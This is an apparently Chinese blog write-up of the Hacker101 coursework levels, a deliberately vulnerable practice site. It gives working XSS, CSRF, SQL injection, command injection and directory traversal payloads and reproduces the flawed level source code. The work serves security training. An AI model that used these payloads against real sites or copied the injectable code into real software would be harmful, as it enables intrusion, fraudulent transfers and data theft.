> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [delikely.github.io](https://delikely.github.io/2018/04/14/Hacker101-writeup/)

> sessions Introduction The Web In Depth XSS and Authorization SQL Injection and Friends Session Fixati......

[](#sessions "sessions")sessions
--------------------------------

*   [Introduction](https://www.hacker101.com/sessions/introduction)
*   [The Web In Depth](https://www.hacker101.com/sessions/web_in_depth)
*   [XSS and Authorization](https://www.hacker101.com/sessions/xss)
*   [SQL Injection and Friends](https://www.hacker101.com/sessions/sqli)
*   [Session Fixation](https://www.hacker101.com/sessions/session_fixation)
*   [Clickjacking](https://www.hacker101.com/sessions/clickjacking)
*   [File Inclusion Bugs](https://www.hacker101.com/sessions/file_inclusion)
*   [File Upload Bugs](https://www.hacker101.com/sessions/file_uploads)
*   [Null Termination Bugs](https://www.hacker101.com/sessions/null_termination)
*   [Unchecked Redirects](https://www.hacker101.com/sessions/unchecked_redirects)
*   [Password Storage](https://www.hacker101.com/sessions/password_storage)
*   Crypto series
    *   [Crypto Crash Course](https://www.hacker101.com/sessions/crypto_crash_course)
    *   [Crypto Attacks](https://www.hacker101.com/sessions/crypto_attacks)
    *   [Crypto Wrap-Up](https://www.hacker101.com/sessions/crypto_wrap-up)

[](#Vulnerabilities "Vulnerabilities")Vulnerabilities
-----------------------------------------------------

*   [Clickjacking](https://www.hacker101.com/vulnerabilities/clickjacking)
*   [Command Injection](https://www.hacker101.com/vulnerabilities/command_injection)
*   [Cross-Site Request Forgery (CSRF)](https://www.hacker101.com/vulnerabilities/csrf)
*   [Directory Traversal](https://www.hacker101.com/vulnerabilities/directory_traversal)
*   [Local/Remote File Inclusion](https://www.hacker101.com/vulnerabilities/file_inclusion)
*   [Improper Authorization](https://www.hacker101.com/vulnerabilities/improper_authorization)
*   [Insecure Password Storage](https://www.hacker101.com/vulnerabilities/insecure_password_storage)
*   [Improper Handling of Null Termination](https://www.hacker101.com/vulnerabilities/null_termination)
*   [Padding Oracle](https://www.hacker101.com/vulnerabilities/padding_oracle)
*   [Reflected Cross-Site Scripting (XSS)](https://www.hacker101.com/vulnerabilities/reflected_xss)
*   [Session Fixation](https://www.hacker101.com/vulnerabilities/session_fixation)
*   [SQL Injection](https://www.hacker101.com/vulnerabilities/sqli)
*   [Stored Cross-Site Scripting (XSS)](https://www.hacker101.com/vulnerabilities/stored_xss)
*   [Stream Cipher Key Reuse](https://www.hacker101.com/vulnerabilities/stream_reuse)
*   [Unchecked Redirect](https://www.hacker101.com/vulnerabilities/unchecked_redirect)

[](#Coursework "Coursework")Coursework
--------------------------------------

*   [Level 0: Breakerbank](https://www.hacker101.com/coursework/level0)
*   [Level 1: Breakbook](https://www.hacker101.com/coursework/level1)
*   [Level 2: Breaker Profile](https://www.hacker101.com/coursework/level2)
*   [Level 3: Breaker CMS](https://www.hacker101.com/coursework/level3)
*   [Level 4: Breaker News](https://www.hacker101.com/coursework/level4)
*   [Level 5: Document Repository](https://www.hacker101.com/coursework/level5)
*   [Level 6: Student Center](https://www.hacker101.com/coursework/level6)
*   [Level 7: Guardian](https://www.hacker101.com/coursework/level7)
*   [Level 8: Document Exchange](https://www.hacker101.com/coursework/level8)

[](#level-0 "level 0")level 0
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517843728333.png)

刚试了第一题的 XSS，被 chrome 拦截了。看来得换 firefox 做!

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/error%20xss%20.png)

### [](#前端源码 "前端源码")前端源码

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/hacker%20101%20coursework1%20source.png)

### [](#xss "xss")xss

```
1000"><script>alert(1)</script><img scr="none" border="0px
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/hacker%20101%20xss%201.png)

```
Destination account: <input type="input" ><br>
Amount: <input type="input" >
```

Destination account 对敏感的输入做了转码，而 Amount 没有，所以导致了反射型 XSS 的出现。

### [](#CSRF "CSRF")CSRF

post 型的 CSRF，需要放在 iframe 中才能绕过同源策略的限制。提交转账请求的时候没有任何校验请求的发送者是真实人发送的还是有代码触发的。一般的防御措施有：

*   验证码（缺陷不可能任何请求都添加验证码）
*   Referer（可以伪造）
*   Token 验证（广泛采用的方法）

自己编写利用脚本利用 CSRF，内容如下。参考 [https://www.hacker101.com/vulnerabilities/csrf](https://www.hacker101.com/vulnerabilities/csrf) 给的利用代码

```
<!doctype html>
<html>

<head>
<title>Test CSRF </title>
</head>

<body>
<iframe ></iframe>
<form method='POST' action='https://levels-a.hacker101.com/levels/0/' target="csrf-frame">
	<input type='hidden' name='to' value='1811'>
    <input type='hidden' name='amount' value='1234'>
	<input type='submit' value='Transfer'>
</form>

<script>document.getElementById("csrf-form").submit()</script>
</body>

</html>
```

我当前登录的账号为 1711，只要访问此页面就会自动给 1811 转账 $1234。

在加载 iframe 中，提交 post 请求时使用的 cookie 是已登录用户 1711 的 cookie，故服务器会以为是 1711 发起的转账请求，并完成了转账操作。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/csrf.png)

### [](#权限绕过 "权限绕过")权限绕过

表单中添加 from，任意指定转账的发起方。测试时，直接在 POST 的参数中添加 from 参数。

```
POST /levels/0/ HTTP/1.1
Host: levels-a.hacker101.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://levels-a.hacker101.com/levels/0/
Cookie: SACSID=~AJKiYcHhGpu6PLMyeIsvo_lfjScoVo39CNylmh9BaI6_3jAwKOGUqDAEkKzhCofsSw7y1X_V7lFNTj-tT71ZWWRCNHLF5SKYWmuKHxyW2FWtd4optMQtaYzsYu6L2d5wTz3agQJU87kT7C-ibOhaAmoAGa1Rp5WZuqSdM2yXkxl7S3wV8NE3dzllcp72U7G6M35BEdv17DEQe0JdQPSfI6iAFB2Tmf1CbDGj2VCPnS7hBriVanmD8DkhZXft9G2yWjgSfWecvJO8_OLrMFi12Ogf9sbbLM78wVjV3pY_R-eSA-O8FjCBaTPvgRIGklnli_LM4YOAK7HS2o43B-ITpJoD5_FTZ9cGbQ
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

to=1811&amount=111&from=1221
```

权限绕过 参考 [https://octfive.cn/299](https://octfive.cn/299)

[](#level-1 "level 1")level 1
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517843759102.png)

### [](#XSS "XSS")XSS

1.  判断哪些符号被过滤输入
    
    测试`'<>:;"test` ，结果`<td>'&lt;&gt;:;"test</td>`，可以看出尖括号被过滤了。
    
2.  是否有部分标签没有被过滤
    
    测试测试`<img>`，结果`<td>&lt;img&gt;</td>`。`<img>` 被过滤。
    
3.  判断是否为递归转译
    
    测试`<im<img>g>`，结果`<td>&lt;im&lt;img&gt;g&gt;</td>`， 是递归转移。
    
4.  url 编码绕过，看服务端是否会还原 url 编码
    
    测试`%3cscript%3ealert(%22xss%22)%3c/script%3e`， url 编码没有被还原。script 关键字没有被过滤。
    
    后测试 unicode 编码`\u003cimg src=1 onerror=alert(/xss/)\u003e`、 `u003cimg src=1 onerror=alert(/xss/)u003e`
    
5.  仔细看题发现，提示 “HTML disallowed, but links will be clickable.”、
    
    5.1 测试`<a herf="http://www.test.com">Click</a>`, 结果`<td>&lt;a herf="<a href="http://www.test.com"&gt;Click&lt;/a&gt;">http://www.test.com"&gt;Click&lt;/a&gt;</a></td>`, 发现可以利用。
    
    5.2 加入 JavaScript 伪协议`<a herf=javascript:alert(1);>Click</a>`, 结果 `<td>&lt;a herf=javascript:alert(1);&gt;Click&lt;/a&gt;</td>`, 发现被转译
    
    5.3 将 javascript:alert(1) 放在 href 中判断是否服务端通过关键字匹配过滤掉了 javascript:alert(1) .`<a herf="[http://www.javascript:alert(1).com">Click](http://www.javascript:alert%281%29.com)`, 结果`<td>&lt;a herf="<a href="http://www.javascript:alert(1).com"&gt;Click&lt;/a&gt;">http://www.javascript:alert(1).com"&gt;Click&lt;/a&gt;</a></td>`。发现 javascript:alert(1) 没有被过滤。事实上在 5.2 中就可以看出来没有被过滤。但是在 5.2 中没有触发出异常。
    
    5.4 开始一点一点删除 5.3 的 herf 中字符，向 5.2 靠近。最后发现必须是`<a href="http://` 的格式才能触发异常，于是开始构建代码进行处理。能够被解析成为 html 代码的片段，只能是 href 中的部分。于是需要绕过**空格限制** 。
    
    5.5 绕过空格限制
    
    ​ 测试`<a herf="http://"onmouseover=javascript:alert(1)`， 结果`<td>&lt;a herf="<a href="http://"onmouseover=javascript:alert(1)">http://"onmouseover=javascript:alert(1)</a></td>` 。发现是双引号没有匹配正确，试了好几次发现只要添加一个`"` ，使引号正确配对就可以了。
    
6.  最终代码  
    payload
    
    ```
    <a herf="http://"onmouseover="javascript:alert(1)
    ```
    
    经过后台处理的代码
    
    ```
    <td><a herf="<a href="http://"onmouseover="javascript:alert(1)">http://"onmouseover="javascript:alert(1)</a></td>
    ```
    
    当鼠标经过是, 出现弹窗。故说明存在存储型 XSS。
    
7.  其他的一些尝试
    
    7.1 使用 url 编码空格为 %20，无效。
    
    7.2 使用；代替空格，无效。这个姿势不知道行不行，记不清书上怎么讲的了。
    
8.  发现一个技巧
    
    不一定每次都要提交自己的代码，让服务器解析，来看载荷的效果。也可以现在本地测试一下，优化一下自己的载荷后，再提交。即使用 F12 调出调试工具，编辑 html，在被服务器解析的源码基础上测试可能的方案，调优后在提交到服务器测试。这样做的好处是，减少了测试的时间，比如这一道题目是存储型的 XSS，当提交了数据后后跳转到另一界面，看结果看需要跳转回来。如果每次都能提交更优的载荷，那么就会省掉很多这种跳转操作。
    
    简而言之: **对自己的猜测，尽量在本地测试一下**
    
    ![](https://delikely.github.io/2018/04/14/Hacker101-writeup/XSS%20trick.gif)
    

### [](#CSRF-with-csrf-token "CSRF with csrf token")CSRF with csrf token

Token 重用 + XSS

想过，用 xss 获取 token，但由于引发 xss 的前提是需要提前知道 csrf token 所以这种方法行不通。

又过了两天，拿起再看看，试试重放，发现成功了。csrf 不是使用一次就失效，可以多次使用。首先获取到提交页面获取 token，然后在利用代码中使用。后来，看别人的解答。才知道只要给任意 32 位的 token 就能过，只验证了 token 的长度，没有验证 token 的内容。回过头来看重放的思路不对，作者的意图是让我们猜测 csrf token 的结构，然后构造 token 进行绕过。以下应当才是正确的思路。

另外 token 是用户名的 MD5 值，可根据用户名构造 token。

```
<html>

<head>
<title>Test CSRF </title>
</head>
<body  onload="getCSRFToekn()">
<iframe src="https://levels-a.hacker101.com/levels/1/" ></iframe>
<form method='POST' action='https://levels-a.hacker101.com/levels/1/post' target="csrf-frame" onload="getCSRFToekn()">
	<input type='hidden' javascript:alert(1)'>
    <input type='hidden' name='csrf' value='56d27afecc9f901080e76f45c12747bd'>
	<input type='submit'>
</form>

<script>document.getElementById("csrf-form").submit()</script>

</body>
</html>
```

### [](#Forced-Browsing "Forced Browsing")Forced Browsing

查看自己每次测试的详情，更改 id 能够访问别人的测试记录。

自己的记录

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517836758756.png)

别人的记录 ![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517837065692.png)

存储型 XSS + 强制浏览![](https://delikely.github.io/2018/04/14/Hacker101-writeup/Forced%20Browsing%202.gif)

[](#level-2 "level 2")level 2
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517843790308.png)

### [](#Stored-XSS "Stored XSS")Stored XSS

测试了一下 Nickname，发现 <>’” 等符号被转译，于是测试图片地址。pic 的地址必须以. png .jpg 结尾，所以代码插在地址中间部分。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517841300615.png)

另外 description 也存在存储型 XSS。

```
[ red"><img src="" onerror="alert(1)" /> " | All ] [ orange | the ] [ yellow | colors ] [ green | of ] [ blue | the ] [ purple | rainbow! ]
```

“颜色” 没有进行过滤和转发，在各种颜色后面都可以触发 XSS。

### [](#Reflected-XSS "Reflected XSS")Reflected XSS

```
https://levels-a.hacker101.com/levels/2/edit?id="><script>alert("xss")</script>
```

测试参数 id，发现存在发射型 XSS。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517843354347.png)

不知道是什么意思

[](#level-3 "level 3")level 3
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517886629056.png)

进来看了一下题，有 xss，但是没有框、参数之类的。那就先做 Improper Authorization 吧！

### [](#Improper-Authorization "Improper Authorization")Improper Authorization

源码里的 js 写的很清楚，需要改 cookie 绕过登录。

```
var page = window.location.hash.substring(1);
if(page == '')
	page = 'index';
	var cookies = document.cookie.split(';');
	for(var i in cookies) {
		var cookie = cookies[i].replace(/ /g, '').split('=');
		if(cookie[0] == 'admin' && cookie[1] == '1')
		document.write('<a href="/levels/3/admin?page=' + page + '">Edit this page</a>');
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517887951491.png)

结合 js 和 cookie 值可知，修改 cookie 中 admin 对应的值 1, 即可。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517886865871.png)

修改之后，首页多了一个链接。现在的身份已经是 admin 了。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517886498406.png)

#### [](#技巧 "技巧")技巧

调试的时候，不知道 cookie[0] 当前值为多少，但想知道当前值是多少。怎么办，可以写油猴脚本。此题这样做可能会复杂一点，若是复杂一点的逻辑可以试试这种方法。

```
(function() {
    'use strict';
    var page = window.location.hash.substring(1);
    if(page == '')
        page = 'index';
    var cookies = document.cookie.split(';');
    for(var i in cookies) {
        var cookie = cookies[i].replace(/ /g, '').split('=');
        console.log("cookie:" + cookie);
        console.log("cookie[0]:" + cookie[0]);
        console.log("cookie[1]:" + cookie[1]);
        if(cookie[0] == 'admin' && cookie[1] == '1')
            console.log('<a href="/levels/3/admin?page=' + page + '">Edit this page</a>');
    }
    
})();
```

重新加载页面，就能看到 cookie、cookie[0]、cookie[1] 的值了。如果这些值没有满足条件，只需针对性修改就可以了。这样做的好处是很直观。

**解此题**

首先看看 cookie、cookie[0]、cookie[1] 的值。这题要求 cookie[0] 等于 admin，cookie[1] 等于 1。现在 cookie[0] 满足条件了，现在只需要修改 cookie[1] 让它等于 1。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517887482097.png)

修改 admin 的 cookie 值为 1 后的输出，现在条件都满足了。这一题完成了！

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517887294804.png)

### [](#Various-XSS "Various XSS")Various XSS

*   Page Body 存储型 XSS
    
    直接插入 script 会被过滤掉。img 标签还是很好用。
    
    虽然提示说 DOM 事件会被过过滤，难道是漏洞了 onerror。也不是，测试发现之后 onerror 在 img 标签内才不会被过滤掉，在 a 标签中就被过滤掉了（会显示 JS Detected!）。
    
    ```
    <img src="#" onerror="alert(1)">
    
    <ScRiPt>alert(1);</ScRiPt>
    
    <isindex action="javascript:alert(1)" type=image>
    
    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
    ```
    
    ![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517888597706.png)
    

xss 弹窗

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517891355836.png)

xss 绕过参考：[http://www.freebuf.com/articles/web/20282.html](http://www.freebuf.com/articles/web/20282.html)

[](#level-4 "level 4")level 4
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517919228408.png)

有点像 hackernews，点进去是大家的测试代码，看来不少人测试成功了（一进去满是弹窗）。

### [](#XSS-1 "XSS")XSS

把之前第二题用过的代码`herf="http://"onmouseover="javascript:alert(1)`，放在进去测试。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517919354097.png)

以下是服务器处理之后，返回的代码。可以看出`herf="http://"onmouseover="javascript:alert(1)` 中第一个`"` 之后的代码在后面出现了而且还没有被转译。

```
<a href="http://"onmouseover="javascript:alert(1)"><script>alert(1)</script></a> ("onmouseover="javascript:alert(1))<br>
```

于是构造出`http://""<img src="" onerror=alert(2)>` , 提交弹窗出现了。  

```
<a href="http://""<img src="" onerror=alert(1024)>">try again</a> (""<img src="" onerror=alert(1024)>)<br>
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517919940872.png)

### [](#CSRF-1 "CSRF")CSRF

*   发布帖子
    
    > 用两个账号获取不同的 csrf  
    > 2e2e2e4e6f7420746869732074696d6521fead9de65b071673d99156141e19792f  
    > 2e2e2e4e6f7420746869732074696d6521b8a293a191f581aaf42bbf2a2df4f24f
    > 
    > 66 位
    > 
    > 使用 burpsuite 发现前面一部份是 ASCII HEX 编码  
    > 2e2e2e4e6f7420746869732074696d6521  
    > …Not this time!
    > 
    > 剩下的 32 位 应该是 md5，应该和用户名有关  
    > fead9de65b071673d99156141e19792f  
    > b8a293a191f581aaf42bbf2a2df4f24f  
    > 尝试了用户名 /…Not this time!/Breaker News 各种组合的 MD5 但是不对  
    > …Not this time! 的意思是不是要做其他题，然后回头来做这题。例如 Systemic Information Disclosures 会不会有提示！
    
*   删帖（无效）
    
    把 id 换成被人的，提示不能删除。这个功能不存在 csrf。
    
    ![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1517925099885.png)
    

*   点赞
    
    点赞呢？csrf 点赞。
    
    首先，不存在重复点赞的情况。（重放攻击，刷赞）
    
    只要指定 id 就能为别人刷赞，这也应该一个是 csrf 吧！firefox 有效，chrome 无效。
    
    ```
    <html>
    
    <head>
    <title>Test CSRF </title>
    </head>
    <body>
    	<img src="http://levels-a.hacker101.com/levels/4/vote?change=1&type=Story&id=4721001476653056&from=https://levels-a.hacker101.com/levels/4/" alt="none" />
    </body>
    
    </html>
    ```
    
    ### [](#Unchecked-Redirects "Unchecked Redirects")Unchecked Redirects
    

理论：[http://blog.csdn.net/quiet_girl/article/details/50616927](http://blog.csdn.net/quiet_girl/article/details/50616927)

```
http://levels-a.hacker101.com/levels/4/vote?change=1&type=Story&id=4721001476653056&from=http://www.google.com

https://levels-a.hacker101.com/levels/4/delete?id=6324050641027072&type=Story&from=https://www.google.com
```

在投票、删帖之后需要跳转后原来的页面，但可以修改 from 的值。由于没有任何检查，从而实现重定向到任意的 url。

### [](#Systemic-Information-Disclosures "Systemic Information Disclosures")Systemic Information Disclosures

绝对路径泄露，不知道算不算？

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519655383819.png)

### [](#Improper-Identity-Handling "Improper Identity Handling")Improper Identity Handling

[](#level-5 "level 5")level 5
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519805326170.png)

### [](#Directory-Traversal "Directory Traversal")Directory Traversal

```
https://levels-b.hacker101.com/level5?path=./../../
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519782047229.png)

#### [](#读取文件 "读取文件")读取文件

直接跟路径发现报错（路径遍历的时候 [https://levels-b.hacker101.com/level5/read?path=../main.py），提示 No](https://levels-b.hacker101.com/level5/read?path=../main.py%EF%BC%89%EF%BC%8C%E6%8F%90%E7%A4%BANo) such file: main.py。猜测过滤掉了../，尝试绕过。使用 [https://levels-b.hacker101.com/level5/read?path=....//main.py](https://levels-b.hacker101.com/level5/read?path=....//main.py) 读取到了文件。

### [](#Reflected-XSS-1 "Reflected XSS")Reflected XSS

path 参数存在反射性 XSS 漏洞，当路径不存在时未经过滤而直接报错输出。

```
https://levels-b.hacker101.com/level5?path=/ebook<script>alert("xss")</script>
https://levels-b.hacker101.com/level5/read?path=/ebooks/alice.txt<script>alert("xss")</script>
```

### [](#Command-Injection "Command Injection")Command Injection

根据源码，可以出一下请求

> [https://levels-b.hacker101.com/level5/post_search](https://levels-b.hacker101.com/level5/post_search)
> 
> post 数据：csrf=644b6355ee205742d9476a7f366a453f&path=../&text=niceAAA”;id;cd “

```
commands.getoutput('grep -r "%s" .' % text)
'grep -r "%s" .' %text
'grep -r niceAAA";id;cd .'
```

添加 cd 是为了闭合后面的点号，一遍执行任意命令。

在本地编写代码测试，发现需要闭合双引号。测试发现使用” 需要转译，否则会报错。测试代码如下

```
import commands
import os
text = "niceAAA\";ls;cd\""
print 'grep -r "%s" .' % text
print commands.getoutput('grep -r "%s" .' % text)
```

但是直接使用`niceAAA\";ls;cd\"` 无效, 猜测是编码问题。url 编码等尝试未果后，删除了转译符号，测试通过。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519800662072.png)

### [](#源码 "源码")源码

```
import commands, os
from handler import *
from glob import glob
from os.path import isfile, isdir

@handler('level5/index')
def get_index(path='/'):
	if not isdir('level5_docs/' + path):
		return 'No such directory: ' + path

	if not path.endswith('/'):
		path += '/'
	dirs = []
	files = []
	for fn in glob('level5_docs/' + path + '*'):
		if isdir(fn):
			dirs.append(fn.rsplit('/', 1)[1])
		else:
			files.append(fn.rsplit('/', 1)[1])

	return dict(path=path, dirs=dirs, files=files)

@handler
def get_read(path):
	path = path.replace('../', '')
	try:
		return Response(file('level5_docs/' + path).read(), mimetype='text/plain')
	except:
		return 'No such file: ' + path

@handler
def post_search(path, text):
	old = os.getcwd()
	try:
		os.chdir('level5_docs/' + path)
		out = commands.getoutput('grep -r "%s" .' % text)
	finally:
		os.chdir(old)
	return out.replace('<', '<').replace('>', '>').replace('\n', '<br>')
```

[](#level-6 "level 6")level 6
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519805366516.png)

### [](#Reflected-Stored-XSS "Reflected/Stored XSS")Reflected/Stored XSS

#### [](#Reflected-XSS-2 "Reflected XSS")Reflected XSS

```
https://levels-b.hacker101.com/level6?filter="><script>alert("xss")</script>
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519805957215.png)

#### [](#Stored-XSS-1 "Stored XSS")Stored XSS

主页显示的时候，特殊字符做了转译，但在编译页面没有做转译。first name 做了转译，last name 没有做转译。

```
Doe<img src="><img src=1 onerror=alert("xss")>
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519805239531.png)

### [](#SQL-Injection "SQL Injection")SQL Injection

sqlmap 跑出来的

```
https://levels-b.hacker101.com/level6?filter=j') UNION SELECT DISTINCT database(),version(),user() --+
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519913511837.png)

查看源码，发现需要首先使用 `')` 闭合前面的部分，然后执行 union 查询，最后注释掉后面的查询。起初尝试了各种闭合的手段，但唯独不知道要用有括号的存在。逆向推测发现，当时用该这样理解。由于是模糊查询 且 firstname 和 lastname 匹配一个即可，应当想到次查询并列，可能会用括号将这两个条件包括在一起。

```
dict(filter=filter, students=db.query("SELECT id, lastname, firstname FROM students WHERE sessid='%s' AND (firstname LIKE '%%%%%s%%%%' OR lastname LIKE '%%%%%s%%%%');" % (handler.sessid(), filter, filter)))
```

### [](#CSRF-2 "CSRF")CSRF

```
不同账号获取到的csrf token
644b6355ee205742d9476a7f366a453f
a355c867f8e3b7d5c9cf1bc596e0145b
```

本想使用反射性 XSS 获取 cookie，但设置了 HttpOnly。这条路行不行。

正好在 Edit 页面同时有 csrf token 和 存储型 XSS ，两者结合起来可以获取到 csrf token。但是怎么触发？必须知道 csrf token 才能触发存储型 XSS，也就是说拿不到别人的 token。故此方法也不可行。

后发现直接向 [https://levels-b.hacker101.com/level6/post_add](https://levels-b.hacker101.com/level6/post_add) 提交数据，不带 csrf token 可以添加成功。

```
<!doctype html>
<html>

<head>
<title>Test CSRF </title>
</head>

<body>
<iframe ></iframe>
	<form action="https://levels-b.hacker101.com/level6/post_add" method="POST">
		<input  type="hidden" type="text"  value='first'>
		<input  type="hidden"  value='last'>
		<input type="submit">
	</form>
</iframe>

<script>document.getElementById("csrf-form").submit()</script>
</body>

</html>
```

源码

```
@handler(CSRFable=True)
def post_add(firstname, lastname):
	db.query("INSERT INTO `students` (firstname, lastname, sessid) VALUES ('%s', '%s', '%s');" % (firstname, lastname, handler.sessid()))

	redirect(get_index)
```

*   不提交 csrf token。
*   提交任意 csrf token。

*   猜测 csrf token 的构造。
*   是不是只校验了长度。
*   可不可以用另一个账号获取的代替，即 token 和账户没有绑定，只要 token 有效即可。
*   使用 XSS 获取 token。

### [](#源码-1 "源码")源码

```
from handler import *

@handler('level6/index')
def get_index(filter=''):
	if db.query('SELECT COUNT(id) FROM students WHERE sessid=%s;', handler.sessid())[0][0] == 0:
		def add(firstname, lastname):
			db.query('INSERT INTO `students` (firstname, lastname, sessid) VALUES (%s, %s, %s);', firstname, lastname, handler.sessid())

		add('John', 'Doe')
		add('Cody', 'Brocious')
		add('Testy', 'McTesterson')

	print filter
	return dict(filter=filter, students=db.query("SELECT id, lastname, firstname FROM students WHERE sessid='%s' AND (firstname LIKE '%%%%%s%%%%' OR lastname LIKE '%%%%%s%%%%');" % (handler.sessid(), filter, filter)))

@handler('level6/edit')
def get_edit(id):
	return dict(student=db.query("SELECT id, lastname, firstname FROM students WHERE id='%s';" % id)[0])

@handler
def post_edit(id, firstname, lastname):
	student = db.query('SELECT sessid FROM students where id=%s', id)
	if student[0][0] != handler.sessid():
		return 'Student does not belong to your account.'

	db.query('UPDATE students SET lastname=%s, firstname=%s WHERE id=%s', lastname, firstname, id)

	redirect(get_index)

@handler('level6/add')
def get_add():
	pass

@handler(CSRFable=True)
def post_add(firstname, lastname):
	db.query("INSERT INTO `students` (firstname, lastname, sessid) VALUES ('%s', '%s', '%s');" % (firstname, lastname, handler.sessid()))

	redirect(get_index)

if not db.hastable('students'):
	db.maketable('students', 
		lastname='VARCHAR(1024)', 
		firstname='VARCHAR(1024)', 
		sessid='CHAR(16)'
	)
```

[](#level-7 "level 7")level 7
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519959728275.png)

###XSS

登录错误提示页面存在 XSS 漏洞，username 特殊符号经过了转译，而 password 没有。

```
https://levels-b.hacker101.com/level7?error=User+does+not+exist&user)</script>
```

### [](#SQL-Injection-1 "SQL Injection")SQL Injection

```
csrf=9c1debdb7dcc0f6a1c67bd4f20454a1b&username=admin' or 1 ’# &password=
```

得到报错信息，user = db.query(“SELECT password FROM users WHERE username=’%s’” % username)  
![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519954198293.png)

```
csrf=9c1debdb7dcc0f6a1c67bd4f20454a1b&username=admin' or 1#&password=
```

先前一直在再试万能密码，但是仍旧提示用户不存在，即查询到的结果为空。猜测表中没有数据。

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519957352419.png)

后使用 union 查询，实现注入。

```
csrf=9c1debdb7dcc0f6a1c67bd4f20454a1b&username=admin' order by 1#&password=
csrf=9c1debdb7dcc0f6a1c67bd4f20454a1b&username=admin'union select 1 #&password=1
```

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519957176364.png)

此题是根据用户名在数据库中查询密码，然后与提交的密码来判断是否一致。

```
from handler import *

@handler('level7/index')
def get_index(error=None, username='admin', password=''):
	return dict(error=error, username=username, password=password)

@handler
def post_index(username, password):
	try:
		user = db.query("SELECT password FROM users WHERE user % username)
	except Exception, e:
		import traceback
		return Response(traceback.format_exc() + '\n' + e[1], mimetype='text/plain')】

	if len(user) == 0:
		redirect(get_index.url(error='User does not exist', username=username, password=password))
	elif user[0][0] == password:
		redirect(get_success.url(username=username))
	else:
		redirect(get_index.url(error='Invalid password', username=username, password=password))

@handler('level7/success')
def get_success(username):
	return dict(username=username)

if not db.hastable('users'):
	db.maketable('users', 
		username='VARCHAR(1024)', 
		password='VARCHAR(1024)'
	)
```

[](#level-8 "level 8")level 8
-----------------------------

![](https://delikely.github.io/2018/04/14/Hacker101-writeup/1519959691722.png)

上传 html 文件，预览时直接进入了下载。比对发现多了 Content-Disposition 属性，它是作为对下载文件的一个标识字段。

### [](#XSS-2 "XSS")XSS

上传任意文件（如 png），burpsuite 代理修改 MIME-type `Content-Type: image/png`为`Content-Type: </td><script>alert(1)</script>onmouseover=alert(1)><td>`

一直以为要通过上传绕过实现 XSS ，让上传的文件得以解析为 HTML，最终在浏览器执行。回过头来想一想，这应该是文件上传漏洞，而不是 XSS 漏洞。

参考 [https://octfive.cn/299](https://octfive.cn/299)

### [](#Directory-Traversal-1 "Directory Traversal")Directory Traversal

不能读取任意文件，但是能够覆盖任意文件

```
POST /level8/post_index HTTP/1.1
Host: levels-b.hacker101.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://levels-b.hacker101.com/level8
Cookie: __cfduid=d479a6128517cfcbef11858640e05c57b1517904353; _ga=GA1.2.410155586.1517904356; _gid=GA1.2.518095736.1522759101; session=.eJyrVkouLkpTsqpWUkhSslKKCnGsinIJLfd1Sa-Kyg018HWJNPUNSTb2dXHK9g8JNIoM96yKykrJ8g0JtFWq1VEqTi0uzkxBaM_1rPIP98r1d_EsBxpjElkVWRWVbgtUWgsA25Mhkw.DaUJVg.ABSSPJf2ADHFWCup3ZSJpD27AzI
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------2062164199649
Content-Length: 439

-----------------------------2062164199649
Content-Disposition: form-data; 

e03d50083fe406917700d946ab3f7c14
-----------------------------2062164199649
Content-Disposition: form-data; 

aaaa
-----------------------------2062164199649
Content-Disposition: form-data; 
Content-Type: application/octet-stream

read-handler.py
-----------------------------2062164199649--
```

修改 filename 为需要覆盖的文件，我们可以拿 level 5 中的目录遍历漏洞查看写入的内容。问题出现 doc.save(‘level8_sandbox/‘ + filename) ，filename 可以是包含 “.” 和 “/“ 的路径。

